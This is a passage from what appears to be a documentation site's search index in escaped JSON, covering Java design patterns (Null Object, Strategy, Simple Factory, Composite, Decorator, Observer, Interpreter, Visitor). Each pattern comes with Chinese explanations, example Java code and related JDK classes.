\u7684\u7A7A\u5BF9\u8C61\u6765\u4EE3\u66FF NULL\u3002
\u4E00\u4E2A\u65B9\u6CD5\u8FD4\u56DE NULL\uFF0C\u610F\u5473\u7740\u65B9\u6CD5\u7684\u8C03\u7528\u7AEF\u9700\u8981\u53BB\u68C0\u67E5\u8FD4\u56DE\u503C\u662F\u5426\u662F NULL\uFF0C\u8FD9\u4E48\u505A\u4F1A\u5BFC\u81F4\u975E\u5E38\u591A\u7684\u5197\u4F59\u7684\u68C0\u67E5\u4EE3\u7801\u3002\u5E76\u4E14\u5982\u679C\u67D0\u4E00\u4E2A\u8C03\u7528\u7AEF\u5FD8\u8BB0\u4E86\u505A\u8FD9\u4E2A\u68C0\u67E5\u8FD4\u56DE\u503C\uFF0C\u800C\u76F4\u63A5\u4F7F\u7528\u8FD4\u56DE\u7684\u5BF9\u8C61\uFF0C\u90A3\u4E48\u5C31\u6709\u53EF\u80FD\u629B\u51FA\u7A7A\u6307\u9488\u5F02\u5E38\u3002`},{header:"Class Diagram",slug:"class-diagram",content:""},{header:"Implementation",slug:"implementation",content:`public abstract class AbstractOperation { abstract void request();
}
public class RealOperation extends AbstractOperation { @Override void request() { System.out.println("do something"); }
}
public class NullOperation extends AbstractOperation{ @Override void request() { // do nothing }
}
public class Client { public static void main(String[] args) { AbstractOperation abstractOperation = func(-1); abstractOperation.request(); } public static AbstractOperation func(int para) { if (para < 0) { return new NullOperation(); } return new RealOperation(); }
}`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%AD%96%E7%95%A5.html",title:"",pathLocale:"/",contents:[{header:"9. \u7B56\u7565\uFF08Strategy\uFF09",slug:"_9-\u7B56\u7565-strategy",content:""},{header:"Intent",slug:"intent",content:`\u5B9A\u4E49\u4E00\u7CFB\u5217\u7B97\u6CD5\uFF0C\u5C01\u88C5\u6BCF\u4E2A\u7B97\u6CD5\uFF0C\u5E76\u4F7F\u5B83\u4EEC\u53EF\u4EE5\u4E92\u6362\u3002
\u7B56\u7565\u6A21\u5F0F\u53EF\u4EE5\u8BA9\u7B97\u6CD5\u72EC\u7ACB\u4E8E\u4F7F\u7528\u5B83\u7684\u5BA2\u6237\u7AEF\u3002`},{header:"Class Diagram",slug:"class-diagram",content:`Strategy \u63A5\u53E3\u5B9A\u4E49\u4E86\u4E00\u4E2A\u7B97\u6CD5\u65CF\uFF0C\u5B83\u4EEC\u90FD\u5B9E\u73B0\u4E86 behavior() \u65B9\u6CD5\u3002
Context \u662F\u4F7F\u7528\u5230\u8BE5\u7B97\u6CD5\u65CF\u7684\u7C7B\uFF0C\u5176\u4E2D\u7684 doSomething() \u65B9\u6CD5\u4F1A\u8C03\u7528 behavior()\uFF0CsetStrategy(Strategy) \u65B9\u6CD5\u53EF\u4EE5\u52A8\u6001\u5730\u6539\u53D8 strategy \u5BF9\u8C61\uFF0C\u4E5F\u5C31\u662F\u8BF4\u80FD\u52A8\u6001\u5730\u6539\u53D8 Context \u6240\u4F7F\u7528\u7684\u7B97\u6CD5\u3002`},{header:"\u4E0E\u72B6\u6001\u6A21\u5F0F\u7684\u6BD4\u8F83",slug:"\u4E0E\u72B6\u6001\u6A21\u5F0F\u7684\u6BD4\u8F83",content:`\u72B6\u6001\u6A21\u5F0F\u7684\u7C7B\u56FE\u548C\u7B56\u7565\u6A21\u5F0F\u7C7B\u4F3C\uFF0C\u5E76\u4E14\u90FD\u662F\u80FD\u591F\u52A8\u6001\u6539\u53D8\u5BF9\u8C61\u7684\u884C\u4E3A\u3002\u4F46\u662F\u72B6\u6001\u6A21\u5F0F\u662F\u901A\u8FC7\u72B6\u6001\u8F6C\u79FB\u6765\u6539\u53D8 Context \u6240\u7EC4\u5408\u7684 State \u5BF9\u8C61\uFF0C\u800C\u7B56\u7565\u6A21\u5F0F\u662F\u901A\u8FC7 Context \u672C\u8EAB\u7684\u51B3\u7B56\u6765\u6539\u53D8\u7EC4\u5408\u7684 Strategy \u5BF9\u8C61\u3002\u6240\u8C13\u7684\u72B6\u6001\u8F6C\u79FB\uFF0C\u662F\u6307 Context \u5728\u8FD0\u884C\u8FC7\u7A0B\u4E2D\u7531\u4E8E\u4E00\u4E9B\u6761\u4EF6\u53D1\u751F\u6539\u53D8\u800C\u4F7F\u5F97 State \u5BF9\u8C61\u53D1\u751F\u6539\u53D8\uFF0C\u6CE8\u610F\u5FC5\u987B\u8981\u662F\u5728\u8FD0\u884C\u8FC7\u7A0B\u4E2D\u3002
\u72B6\u6001\u6A21\u5F0F\u4E3B\u8981\u662F\u7528\u6765\u89E3\u51B3\u72B6\u6001\u8F6C\u79FB\u7684\u95EE\u9898\uFF0C\u5F53\u72B6\u6001\u53D1\u751F\u8F6C\u79FB\u4E86\uFF0C\u90A3\u4E48 Context \u5BF9\u8C61\u5C31\u4F1A\u6539\u53D8\u5B83\u7684\u884C\u4E3A\uFF1B\u800C\u7B56\u7565\u6A21\u5F0F\u4E3B\u8981\u662F\u7528\u6765\u5C01\u88C5\u4E00\u7EC4\u53EF\u4EE5\u4E92\u76F8\u66FF\u4EE3\u7684\u7B97\u6CD5\u65CF\uFF0C\u5E76\u4E14\u53EF\u4EE5\u6839\u636E\u9700\u8981\u52A8\u6001\u5730\u53BB\u66FF\u6362 Context \u4F7F\u7528\u7684\u7B97\u6CD5\u3002`},{header:"Implementation",slug:"implementation",content:`\u8BBE\u8BA1\u4E00\u4E2A\u9E2D\u5B50\uFF0C\u5B83\u53EF\u4EE5\u52A8\u6001\u5730\u6539\u53D8\u53EB\u58F0\u3002\u8FD9\u91CC\u7684\u7B97\u6CD5\u65CF\u662F\u9E2D\u5B50\u7684\u53EB\u58F0\u884C\u4E3A\u3002
public interface QuackBehavior { void quack();
}
public class Quack implements QuackBehavior { @Override public void quack() { System.out.println("quack!"); }
}
public class Squeak implements QuackBehavior{ @Override public void quack() { System.out.println("squeak!"); }
}
public class Duck { private QuackBehavior quackBehavior; public void performQuack() { if (quackBehavior != null) { quackBehavior.quack(); } } public void setQuackBehavior(QuackBehavior quackBehavior) { this.quackBehavior = quackBehavior; }
}
public class Client { public static void main(String[] args) { Duck duck = new Duck(); duck.setQuackBehavior(new Squeak()); duck.performQuack(); duck.setQuackBehavior(new Quack()); duck.performQuack(); }
}
squeak!
quack!`},{header:"JDK",slug:"jdk",content:`java.util.Comparator#compare()
javax.servlet.http.HttpServlet
javax.servlet.Filter#doFilter()`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82.html",title:"",pathLocale:"/",contents:[{header:"\u7B80\u5355\u5DE5\u5382\uFF08Simple Factory\uFF09",slug:"\u7B80\u5355\u5DE5\u5382-simple-factory",content:""},{header:"Intent",slug:"intent",content:"\u5728\u521B\u5EFA\u4E00\u4E2A\u5BF9\u8C61\u65F6\u4E0D\u5411\u5BA2\u6237\u66B4\u9732\u5185\u90E8\u7EC6\u8282\uFF0C\u5E76\u63D0\u4F9B\u4E00\u4E2A\u521B\u5EFA\u5BF9\u8C61\u7684\u901A\u7528\u63A5\u53E3\u3002"},{header:"Class Diagram",slug:"class-diagram",content:`\u7B80\u5355\u5DE5\u5382\u628A\u5B9E\u4F8B\u5316\u7684\u64CD\u4F5C\u5355\u72EC\u653E\u5230\u4E00\u4E2A\u7C7B\u4E2D\uFF0C\u8FD9\u4E2A\u7C7B\u5C31\u6210\u4E3A\u7B80\u5355\u5DE5\u5382\u7C7B\uFF0C\u8BA9\u7B80\u5355\u5DE5\u5382\u7C7B\u6765\u51B3\u5B9A\u5E94\u8BE5\u7528\u54EA\u4E2A\u5177\u4F53\u5B50\u7C7B\u6765\u5B9E\u4F8B\u5316\u3002
\u8FD9\u6837\u505A\u80FD\u628A\u5BA2\u6237\u7C7B\u548C\u5177\u4F53\u5B50\u7C7B\u7684\u5B9E\u73B0\u89E3\u8026\uFF0C\u5BA2\u6237\u7C7B\u4E0D\u518D\u9700\u8981\u77E5\u9053\u6709\u54EA\u4E9B\u5B50\u7C7B\u4EE5\u53CA\u5E94\u5F53\u5B9E\u4F8B\u5316\u54EA\u4E2A\u5B50\u7C7B\u3002\u5BA2\u6237\u7C7B\u5F80\u5F80\u6709\u591A\u4E2A\uFF0C\u5982\u679C\u4E0D\u4F7F\u7528\u7B80\u5355\u5DE5\u5382\uFF0C\u90A3\u4E48\u6240\u6709\u7684\u5BA2\u6237\u7C7B\u90FD\u8981\u77E5\u9053\u6240\u6709\u5B50\u7C7B\u7684\u7EC6\u8282\u3002\u800C\u4E14\u4E00\u65E6\u5B50\u7C7B\u53D1\u751F\u6539\u53D8\uFF0C\u4F8B\u5982\u589E\u52A0\u5B50\u7C7B\uFF0C\u90A3\u4E48\u6240\u6709\u7684\u5BA2\u6237\u7C7B\u90FD\u8981\u8FDB\u884C\u4FEE\u6539\u3002`},{header:"Implementation",slug:"implementation",content:`public interface Product {
}
public class ConcreteProduct implements Product {
}
public class ConcreteProduct1 implements Product {
}
public class ConcreteProduct2 implements Product {
}
\u4EE5\u4E0B\u7684 Client \u7C7B\u5305\u542B\u4E86\u5B9E\u4F8B\u5316\u7684\u4EE3\u7801\uFF0C\u8FD9\u662F\u4E00\u79CD\u9519\u8BEF\u7684\u5B9E\u73B0\u3002\u5982\u679C\u5728\u5BA2\u6237\u7C7B\u4E2D\u5B58\u5728\u8FD9\u79CD\u5B9E\u4F8B\u5316\u4EE3\u7801\uFF0C\u5C31\u9700\u8981\u8003\u8651\u5C06\u4EE3\u7801\u653E\u5230\u7B80\u5355\u5DE5\u5382\u4E2D\u3002
public class Client { public static void main(String[] args) { int type = 1; Product product; if (type == 1) { product = new ConcreteProduct1(); } else if (type == 2) { product = new ConcreteProduct2(); } else { product = new ConcreteProduct(); } // do something with the product }
}
\u4EE5\u4E0B\u7684 SimpleFactory \u662F\u7B80\u5355\u5DE5\u5382\u5B9E\u73B0\uFF0C\u5B83\u88AB\u6240\u6709\u9700\u8981\u8FDB\u884C\u5B9E\u4F8B\u5316\u7684\u5BA2\u6237\u7C7B\u8C03\u7528\u3002
public class SimpleFactory { public Product createProduct(int type) { if (type == 1) { return new ConcreteProduct1(); } else if (type == 2) { return new ConcreteProduct2(); } return new ConcreteProduct(); }
}
public class Client { public static void main(String[] args) { SimpleFactory simpleFactory = new SimpleFactory(); Product product = simpleFactory.createProduct(1); // do something with the product }
}`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%BB%84%E5%90%88.html",title:"",pathLocale:"/",contents:[{header:"\u7EC4\u5408\uFF08Composite\uFF09",slug:"\u7EC4\u5408-composite",content:""},{header:"Intent",slug:"intent",content:"\u5C06\u5BF9\u8C61\u7EC4\u5408\u6210\u6811\u5F62\u7ED3\u6784\u6765\u8868\u793A\u201C\u6574\u4F53/\u90E8\u5206\u201D\u5C42\u6B21\u5173\u7CFB\uFF0C\u5141\u8BB8\u7528\u6237\u4EE5\u76F8\u540C\u7684\u65B9\u5F0F\u5904\u7406\u5355\u72EC\u5BF9\u8C61\u548C\u7EC4\u5408\u5BF9\u8C61\u3002"},{header:"Class Diagram",slug:"class-diagram",content:`\u7EC4\u4EF6\uFF08Component\uFF09\u7C7B\u662F\u7EC4\u5408\u7C7B\uFF08Composite\uFF09\u548C\u53F6\u5B50\u7C7B\uFF08Leaf\uFF09\u7684\u7236\u7C7B\uFF0C\u53EF\u4EE5\u628A\u7EC4\u5408\u7C7B\u770B\u6210\u662F\u6811\u7684\u4E2D\u95F4\u8282\u70B9\u3002
\u7EC4\u5408\u5BF9\u8C61\u62E5\u6709\u4E00\u4E2A\u6216\u8005\u591A\u4E2A\u7EC4\u4EF6\u5BF9\u8C61\uFF0C\u56E0\u6B64\u7EC4\u5408\u5BF9\u8C61\u7684\u64CD\u4F5C\u53EF\u4EE5\u59D4\u6258\u7ED9\u7EC4\u4EF6\u5BF9\u8C61\u53BB\u5904\u7406\uFF0C\u800C\u7EC4\u4EF6\u5BF9\u8C61\u53EF\u4EE5\u662F\u53E6\u4E00\u4E2A\u7EC4\u5408\u5BF9\u8C61\u6216\u8005\u53F6\u5B50\u5BF9\u8C61\u3002`},{header:"Implementation",slug:"implementation",content:`public abstract class Component { protected String name; public Component(String name) { this.name = name; } public void print() { print(0); } abstract void print(int level); abstract public void add(Component component); abstract public void remove(Component component);
}
public class Composite extends Component { private List<Component> child; public Composite(String name) { super(name); child = new ArrayList<>(); } @Override void print(int level) { for (int i = 0; i < level; i++) { System.out.print("--"); } System.out.println("Composite:" + name); for (Component component : child) { component.print(level + 1); } } @Override public void add(Component component) { child.add(component); } @Override public void remove(Component component) { child.remove(component); }
}
public class Leaf extends Component { public Leaf(String name) { super(name); } @Override void print(int level) { for (int i = 0; i < level; i++) { System.out.print("--"); } System.out.println("left:" + name); } @Override public void add(Component component) { throw new UnsupportedOperationException(); // \u727A\u7272\u900F\u660E\u6027\u6362\u53D6\u5355\u4E00\u804C\u8D23\u539F\u5219\uFF0C\u8FD9\u6837\u5C31\u4E0D\u7528\u8003\u8651\u662F\u53F6\u5B50\u8282\u70B9\u8FD8\u662F\u7EC4\u5408\u8282\u70B9 } @Override public void remove(Component component) { throw new UnsupportedOperationException(); }
}
public class Client { public static void main(String[] args) { Composite root = new Composite("root"); Component node1 = new Leaf("1"); Component node2 = new Composite("2"); Component node3 = new Leaf("3"); root.add(node1); root.add(node2); root.add(node3); Component node21 = new Leaf("21"); Component node22 = new Composite("22"); node2.add(node21); node2.add(node22); Component node221 = new Leaf("221"); node22.add(node221); root.print(); }
}
Composite:root
--left:1
--Composite:2
----left:21
----Composite:22
------left:221
--left:3`},{header:"JDK",slug:"jdk",content:`javax.swing.JComponent#add(Component)
java.awt.Container#add(Component)
java.util.Map#putAll(Map)
java.util.List#addAll(Collection)
java.util.Set#addAll(Collection)`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E8%A3%85%E9%A5%B0.html",title:"",pathLocale:"/",contents:[{header:"\u88C5\u9970\uFF08Decorator\uFF09",slug:"\u88C5\u9970-decorator",content:""},{header:"Intent",slug:"intent",content:"\u4E3A\u5BF9\u8C61\u52A8\u6001\u6DFB\u52A0\u529F\u80FD\u3002"},{header:"Class Diagram",slug:"class-diagram",content:"\u88C5\u9970\u8005\uFF08Decorator\uFF09\u548C\u5177\u4F53\u7EC4\u4EF6\uFF08ConcreteComponent\uFF09\u90FD\u7EE7\u627F\u81EA\u7EC4\u4EF6\uFF08Component\uFF09\uFF0C\u5177\u4F53\u7EC4\u4EF6\u7684\u65B9\u6CD5\u5B9E\u73B0\u4E0D\u9700\u8981\u4F9D\u8D56\u4E8E\u5176\u5B83\u5BF9\u8C61\uFF0C\u800C\u88C5\u9970\u8005\u7EC4\u5408\u4E86\u4E00\u4E2A\u7EC4\u4EF6\uFF0C\u8FD9\u6837\u5B83\u53EF\u4EE5\u88C5\u9970\u5176\u5B83\u88C5\u9970\u8005\u6216\u8005\u5177\u4F53\u7EC4\u4EF6\u3002\u6240\u8C13\u88C5\u9970\uFF0C\u5C31\u662F\u628A\u8FD9\u4E2A\u88C5\u9970\u8005\u5957\u5728\u88AB\u88C5\u9970\u8005\u4E4B\u4E0A\uFF0C\u4ECE\u800C\u52A8\u6001\u6269\u5C55\u88AB\u88C5\u9970\u8005\u7684\u529F\u80FD\u3002\u88C5\u9970\u8005\u7684\u65B9\u6CD5\u6709\u4E00\u90E8\u5206\u662F\u81EA\u5DF1\u7684\uFF0C\u8FD9\u5C5E\u4E8E\u5B83\u7684\u529F\u80FD\uFF0C\u7136\u540E\u8C03\u7528\u88AB\u88C5\u9970\u8005\u7684\u65B9\u6CD5\u5B9E\u73B0\uFF0C\u4ECE\u800C\u4E5F\u4FDD\u7559\u4E86\u88AB\u88C5\u9970\u8005\u7684\u529F\u80FD\u3002\u53EF\u4EE5\u770B\u5230\uFF0C\u5177\u4F53\u7EC4\u4EF6\u5E94\u5F53\u662F\u88C5\u9970\u5C42\u6B21\u7684\u6700\u4F4E\u5C42\uFF0C\u56E0\u4E3A\u53EA\u6709\u5177\u4F53\u7EC4\u4EF6\u7684\u65B9\u6CD5\u5B9E\u73B0\u4E0D\u9700\u8981\u4F9D\u8D56\u4E8E\u5176\u5B83\u5BF9\u8C61\u3002"},{header:"Implementation",slug:"implementation",content:`\u8BBE\u8BA1\u4E0D\u540C\u79CD\u7C7B\u7684\u996E\u6599\uFF0C\u996E\u6599\u53EF\u4EE5\u6DFB\u52A0\u914D\u6599\uFF0C\u6BD4\u5982\u53EF\u4EE5\u6DFB\u52A0\u725B\u5976\uFF0C\u5E76\u4E14\u652F\u6301\u52A8\u6001\u6DFB\u52A0\u65B0\u914D\u6599\u3002\u6BCF\u589E\u52A0\u4E00\u79CD\u914D\u6599\uFF0C\u8BE5\u996E\u6599\u7684\u4EF7\u683C\u5C31\u4F1A\u589E\u52A0\uFF0C\u8981\u6C42\u8BA1\u7B97\u4E00\u79CD\u996E\u6599\u7684\u4EF7\u683C\u3002
\u4E0B\u56FE\u8868\u793A\u5728 DarkRoast \u996E\u6599\u4E0A\u65B0\u589E\u65B0\u6DFB\u52A0 Mocha \u914D\u6599\uFF0C\u4E4B\u540E\u53C8\u6DFB\u52A0\u4E86 Whip \u914D\u6599\u3002DarkRoast \u88AB Mocha \u5305\u88F9\uFF0CMocha \u53C8\u88AB Whip \u5305\u88F9\u3002\u5B83\u4EEC\u90FD\u7EE7\u627F\u81EA\u76F8\u540C\u7236\u7C7B\uFF0C\u90FD\u6709 cost() \u65B9\u6CD5\uFF0C\u5916\u5C42\u7C7B\u7684 cost() \u65B9\u6CD5\u8C03\u7528\u4E86\u5185\u5C42\u7C7B\u7684 cost() \u65B9\u6CD5\u3002 public interface Beverage { double cost();
}
public class DarkRoast implements Beverage { @Override public double cost() { return 1; }
}
public class HouseBlend implements Beverage { @Override public double cost() { return 1; }
}
public abstract class CondimentDecorator implements Beverage { protected Beverage beverage;
}
public class Milk extends CondimentDecorator { public Milk(Beverage beverage) { this.beverage = beverage; } @Override public double cost() { return 1 + beverage.cost(); }
}
public class Mocha extends CondimentDecorator { public Mocha(Beverage beverage) { this.beverage = beverage; } @Override public double cost() { return 1 + beverage.cost(); }
}
public class Client { public static void main(String[] args) { Beverage beverage = new HouseBlend(); beverage = new Mocha(beverage); beverage = new Milk(beverage); System.out.println(beverage.cost()); }
}
3.0`},{header:"\u8BBE\u8BA1\u539F\u5219",slug:"\u8BBE\u8BA1\u539F\u5219",content:`\u7C7B\u5E94\u8BE5\u5BF9\u6269\u5C55\u5F00\u653E\uFF0C\u5BF9\u4FEE\u6539\u5173\u95ED\uFF1A\u4E5F\u5C31\u662F\u6DFB\u52A0\u65B0\u529F\u80FD\u65F6\u4E0D\u9700\u8981\u4FEE\u6539\u4EE3\u7801\u3002\u996E\u6599\u53EF\u4EE5\u52A8\u6001\u6DFB\u52A0\u65B0\u7684\u914D\u6599\uFF0C\u800C\u4E0D\u9700\u8981\u53BB\u4FEE\u6539\u996E\u6599\u7684\u4EE3\u7801\u3002
\u4E0D\u53EF\u80FD\u628A\u6240\u6709\u7684\u7C7B\u8BBE\u8BA1\u6210\u90FD\u6EE1\u8DB3\u8FD9\u4E00\u539F\u5219\uFF0C\u5E94\u5F53\u628A\u8BE5\u539F\u5219\u5E94\u7528\u4E8E\u6700\u6709\u53EF\u80FD\u53D1\u751F\u6539\u53D8\u7684\u5730\u65B9\u3002`},{header:"JDK",slug:"jdk",content:`java.io.BufferedInputStream(InputStream)
java.io.DataInputStream(InputStream)
java.io.BufferedOutputStream(OutputStream)
java.util.zip.ZipOutputStream(OutputStream)
java.util.Collections`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E8%A7%82%E5%AF%9F%E8%80%85.html",title:"",pathLocale:"/",contents:[{header:"7. \u89C2\u5BDF\u8005\uFF08Observer\uFF09",slug:"_7-\u89C2\u5BDF\u8005-observer",content:""},{header:"Intent",slug:"intent",content:`\u5B9A\u4E49\u5BF9\u8C61\u4E4B\u95F4\u7684\u4E00\u5BF9\u591A\u4F9D\u8D56\uFF0C\u5F53\u4E00\u4E2A\u5BF9\u8C61\u72B6\u6001\u6539\u53D8\u65F6\uFF0C\u5B83\u7684\u6240\u6709\u4F9D\u8D56\u90FD\u4F1A\u6536\u5230\u901A\u77E5\u5E76\u4E14\u81EA\u52A8\u66F4\u65B0\u72B6\u6001\u3002
\u4E3B\u9898\uFF08Subject\uFF09\u662F\u88AB\u89C2\u5BDF\u7684\u5BF9\u8C61\uFF0C\u800C\u5176\u6240\u6709\u4F9D\u8D56\u8005\uFF08Observer\uFF09\u79F0\u4E3A\u89C2\u5BDF\u8005\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7a3c6a30-c735-4edb-8115-337288a4f0f2.jpg" width="600)`},{header:"Class Diagram",slug:"class-diagram",content:`\u4E3B\u9898\uFF08Subject\uFF09\u5177\u6709\u6CE8\u518C\u548C\u79FB\u9664\u89C2\u5BDF\u8005\u3001\u5E76\u901A\u77E5\u6240\u6709\u89C2\u5BDF\u8005\u7684\u529F\u80FD\uFF0C\u4E3B\u9898\u662F\u901A\u8FC7\u7EF4\u62A4\u4E00\u5F20\u89C2\u5BDF\u8005\u5217\u8868\u6765\u5B9E\u73B0\u8FD9\u4E9B\u64CD\u4F5C\u7684\u3002
\u89C2\u5BDF\u8005\uFF08Observer\uFF09\u7684\u6CE8\u518C\u529F\u80FD\u9700\u8981\u8C03\u7528\u4E3B\u9898\u7684 registerObserver() \u65B9\u6CD5\u3002`},{header:"Implementation",slug:"implementation",content:`\u5929\u6C14\u6570\u636E\u5E03\u544A\u677F\u4F1A\u5728\u5929\u6C14\u4FE1\u606F\u53D1\u751F\u6539\u53D8\u65F6\u66F4\u65B0\u5176\u5185\u5BB9\uFF0C\u5E03\u544A\u677F\u6709\u591A\u4E2A\uFF0C\u5E76\u4E14\u5728\u5C06\u6765\u4F1A\u7EE7\u7EED\u589E\u52A0\u3002 public interface Subject { void registerObserver(Observer o); void removeObserver(Observer o); void notifyObserver();
}
public class WeatherData implements Subject { private List<Observer> observers; private float temperature; private float humidity; private float pressure; public WeatherData() { observers = new ArrayList<>(); } public void setMeasurements(float temperature, float humidity, float pressure) { this.temperature = temperature; this.humidity = humidity; this.pressure = pressure; notifyObserver(); } @Override public void registerObserver(Observer o) { observers.add(o); } @Override public void removeObserver(Observer o) { int i = observers.indexOf(o); if (i >= 0) { observers.remove(i); } } @Override public void notifyObserver() { for (Observer o : observers) { o.update(temperature, humidity, pressure); } }
}
public interface Observer { void update(float temp, float humidity, float pressure);
}
public class StatisticsDisplay implements Observer { public StatisticsDisplay(Subject weatherData) { weatherData.registerObserver(this); } @Override public void update(float temp, float humidity, float pressure) { System.out.println("StatisticsDisplay.update: " + temp + " " + humidity + " " + pressure); }
}
public class CurrentConditionsDisplay implements Observer { public CurrentConditionsDisplay(Subject weatherData) { weatherData.registerObserver(this); } @Override public void update(float temp, float humidity, float pressure) { System.out.println("CurrentConditionsDisplay.update: " + temp + " " + humidity + " " + pressure); }
}
public class WeatherStation { public static void main(String[] args) { WeatherData weatherData = new WeatherData(); CurrentConditionsDisplay currentConditionsDisplay = new CurrentConditionsDisplay(weatherData); StatisticsDisplay statisticsDisplay = new StatisticsDisplay(weatherData); weatherData.setMeasurements(0, 0, 0); weatherData.setMeasurements(1, 1, 1); }
}
CurrentConditionsDisplay.update: 0.0 0.0 0.0
StatisticsDisplay.update: 0.0 0.0 0.0
CurrentConditionsDisplay.update: 1.0 1.0 1.0
StatisticsDisplay.update: 1.0 1.0 1.0`},{header:"JDK",slug:"jdk",content:`java.util.Observer
java.util.EventListener
javax.servlet.http.HttpSessionBindingListener
RxJava`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E8%A7%A3%E9%87%8A%E5%99%A8.html",title:"",pathLocale:"/",contents:[{header:"\u89E3\u91CA\u5668\uFF08Interpreter\uFF09",slug:"\u89E3\u91CA\u5668-interpreter",content:""},{header:"Intent",slug:"intent",content:"\u4E3A\u8BED\u8A00\u521B\u5EFA\u89E3\u91CA\u5668\uFF0C\u901A\u5E38\u7531\u8BED\u8A00\u7684\u8BED\u6CD5\u548C\u8BED\u6CD5\u5206\u6790\u6765\u5B9A\u4E49\u3002"},{header:"Class Diagram",slug:"class-diagram",content:`TerminalExpression\uFF1A\u7EC8\u7ED3\u7B26\u8868\u8FBE\u5F0F\uFF0C\u6BCF\u4E2A\u7EC8\u7ED3\u7B26\u90FD\u9700\u8981\u4E00\u4E2A TerminalExpression\u3002
Context\uFF1A\u4E0A\u4E0B\u6587\uFF0C\u5305\u542B\u89E3\u91CA\u5668\u4E4B\u5916\u7684\u4E00\u4E9B\u5168\u5C40\u4FE1\u606F\u3002`},{header:"Implementation",slug:"implementation",content:`\u4EE5\u4E0B\u662F\u4E00\u4E2A\u89C4\u5219\u68C0\u9A8C\u5668\u5B9E\u73B0\uFF0C\u5177\u6709 and \u548C or \u89C4\u5219\uFF0C\u901A\u8FC7\u89C4\u5219\u53EF\u4EE5\u6784\u5EFA\u4E00\u9897\u89E3\u6790\u6811\uFF0C\u7528\u6765\u68C0\u9A8C\u4E00\u4E2A\u6587\u672C\u662F\u5426\u6EE1\u8DB3\u89E3\u6790\u6811\u5B9A\u4E49\u7684\u89C4\u5219\u3002
\u4F8B\u5982\u4E00\u9897\u89E3\u6790\u6811\u4E3A D And (A Or (B C))\uFF0C\u6587\u672C "D A" \u6EE1\u8DB3\u8BE5\u89E3\u6790\u6811\u5B9A\u4E49\u7684\u89C4\u5219\u3002
\u8FD9\u91CC\u7684 Context \u6307\u7684\u662F String\u3002
public abstract class Expression { public abstract boolean interpret(String str);
}
public class TerminalExpression extends Expression { private String literal = null; public TerminalExpression(String str) { literal = str; } public boolean interpret(String str) { StringTokenizer st = new StringTokenizer(str); while (st.hasMoreTokens()) { String test = st.nextToken(); if (test.equals(literal)) { return true; } } return false; }
}
public class AndExpression extends Expression { private Expression expression1 = null; private Expression expression2 = null; public AndExpression(Expression expression1, Expression expression2) { this.expression1 = expression1; this.expression2 = expression2; } public boolean interpret(String str) { return expression1.interpret(str) && expression2.interpret(str); }
}
public class OrExpression extends Expression { private Expression expression1 = null; private Expression expression2 = null; public OrExpression(Expression expression1, Expression expression2) { this.expression1 = expression1; this.expression2 = expression2; } public boolean interpret(String str) { return expression1.interpret(str) || expression2.interpret(str); }
}
public class Client { /** * \u6784\u5EFA\u89E3\u6790\u6811 */ public static Expression buildInterpreterTree() { // Literal Expression terminal1 = new TerminalExpression("A"); Expression terminal2 = new TerminalExpression("B"); Expression terminal3 = new TerminalExpression("C"); Expression terminal4 = new TerminalExpression("D"); // B C Expression alternation1 = new OrExpression(terminal2, terminal3); // A Or (B C) Expression alternation2 = new OrExpression(terminal1, alternation1); // D And (A Or (B C)) return new AndExpression(terminal4, alternation2); } public static void main(String[] args) { Expression define = buildInterpreterTree(); String context1 = "D A"; String context2 = "A B"; System.out.println(define.interpret(context1)); System.out.println(define.interpret(context2)); }
}
true
false`},{header:"JDK",slug:"jdk",content:`java.util.Pattern
java.text.Normalizer
All subclasses of java.text.Format
javax.el.ELResolver`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E8%AE%BF%E9%97%AE%E8%80%85.html",title:"",pathLocale:"/",contents:[{header:"\u8BBF\u95EE\u8005\uFF08Visitor\uFF09",slug:"\u8BBF\u95EE\u8005-visitor",content:""},{header:"Intent",slug:"intent",content:"\u4E3A\u4E00\u4E2A\u5BF9\u8C61\u7ED3\u6784\uFF08\u6BD4\u5982\u7EC4\u5408\u7ED3\u6784\uFF09\u589E\u52A0\u65B0\u80FD\u529B\u3002"},{header:"Class Diagram",slug:"class-diagram",content:`Visitor\uFF1A\u8BBF\u95EE\u8005\uFF0C\u4E3A\u6BCF\u4E00\u4E2A ConcreteElement \u58F0\u660E\u4E00\u4E2A visit \u64CD\u4F5C
ConcreteVisitor\uFF1A\u5177\u4F53\u8BBF\u95EE\u8005\uFF0C\u5B58\u50A8\u904D\u5386\u8FC7\u7A0B\u4E2D\u7684\u7D2F\u8BA1\u7ED3\u679C
ObjectStructure\uFF1A\u5BF9\u8C61\u7ED3\u6784\uFF0C\u53EF\u4EE5\u662F\u7EC4\u5408\u7ED3\u6784\uFF0C\u6216\u8005\u662F\u4E00\u4E2A\u96C6\u5408\u3002`},{header:"Implementation",slug:"implementation",content:`public interface Element { void accept(Visitor visitor);
}
class CustomerGroup { private List<Customer> customers = new ArrayList<>(); void accept(Visitor visitor) { for (Customer customer : customers) { customer.accept(visitor); } } void addCustomer(Customer customer) { customers.add(customer); }
}
public class Customer implements Element { private String name; private List<Order> orders = new ArrayList<>(); Customer(String name) { this.name = name; } String getName() { return name; } void addOrder(Order order) { orders.add(order); } public void accept(Visitor visitor) { visitor.visit(this); for (Order order : orders) { order.accept(visitor); } }
}
